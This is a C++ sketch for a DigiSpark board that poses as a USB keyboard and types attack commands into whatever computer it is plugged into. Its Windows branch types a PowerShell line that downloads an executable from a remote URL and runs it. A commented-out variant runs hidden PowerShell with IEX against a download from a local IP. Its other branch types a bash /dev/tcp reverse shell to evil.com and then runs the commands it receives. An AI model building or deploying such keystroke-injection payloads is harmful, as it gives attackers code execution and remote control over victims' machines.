/*
Code to be run on DigiSpark compatible boards
*/

#include <avr/wdt.h>
#include "DigiKeyboard.h"
#define ITA

static int run;

void blinkLed();
bool win_os();

void setup()
{
  // using watchdogs, the HID emulation can be reset if it hangs
  wdt_enable(WDTO_4S);
  run = 0;

  // pin setup to blink led
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A
}

void loop()
{
  wdt_reset();

  if (win_os())
  {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    /*
      DigiKeyboard.println("cmd");
      DigiKeyboard.delay(500);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(500);
    */
    wdt_reset();
    DigiKeyboard.println("PowerShell (New-Object System.Net.WebClient).DownloadFile('https://github.com/grcasanova/Grapher/raw/master/func.exe','mess.exe');Start-Process 'mess.exe'");
    /*
      #ifdef ITA
      DigiKeyboard.println("powershell.exe /nop /w hidden /c $)new/object net.webclient<$c.proxy)[Net.WebRequest]>>GetSystemWebProxy*(<$c.Proxy.Credentials)[Net.CredentialsCache]>>DefaultCredentials<IEX $c.downloadstring*-http>&&192.168.1.121>8080&exploit-(<");
      #else
      DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.121:8080/exploit');");
      #endif
    */
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(800);
    DigiKeyboard.println("exit");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    wdt_reset();
  }
  else
  {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("exec 5<>/dev/tcp/evil.com/8080");
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    wdt_reset();
    DigiKeyboard.delay(800);
    DigiKeyboard.println("cat <&5 | while read line; do $line 2>&5 >&5; done");
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    wdt_reset();
  }

  DigiKeyboard.update();

  // after the second run (at the third run), the led starts blinking indefinitely
  if (run > 2)
    blinkLed();
  else
    run++;
}

bool win_os()
{
  // TBD - needs to be implemented
  return true;
}

void blinkLed()
{
  while (true) {
    wdt_reset();
    digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
    digitalWrite(1, HIGH);
    delay(250);               // wait for 1/4 of a second
    digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
    digitalWrite(1, LOW);
    delay(250);
  }
}
